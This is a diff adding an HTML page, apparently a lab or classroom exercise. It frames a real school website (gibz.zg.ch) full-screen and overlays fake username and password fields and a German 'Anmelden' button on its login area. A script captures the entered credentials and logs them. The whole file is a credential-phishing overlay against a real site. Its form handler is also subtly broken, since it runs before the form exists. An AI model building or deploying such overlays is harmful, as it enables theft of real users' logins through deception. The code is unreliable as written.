@@ -1,0 +1,30 @@
+<html>
+    <head>
+        <script>
+            var iframe;
+            window.addEventListener("DOMContentLoaded", function(){
+                iframe = document.createElement("iframe");
+                iframe.width = "100%";
+                iframe.height = "100%";
+                iframe.src = "https://gibz.zg.ch";
+                document.body.appendChild(iframe);
+            });
+            document.getElementById("myForm").onsubmit = function(event) {
+                event.preventDefault();
+                var userAndPassword = {
+                    user: document.getElementById("username").value,
+                    password: document.getElementById("password").value
+                }
+                console.log(userAndPassword);
+            }
+        </script>
+    </head>
+    <body style="margin:0">
+        <form id="myForm" style="margin:0">
+            <input id="username" type="text" style="position:fixed; top:233px; left: 368px; width:370px; height:22px">
+            <input id="password" type="password" style="position:fixed; top:281px; left: 368px; width:370px; height:22px"> 
+            <input type="submit" style="position:fixed; top:314px; left: 368px; width:75px; height:23px" value="Anmelden"> 
+        </form>
+        
+    </body>
+</html>
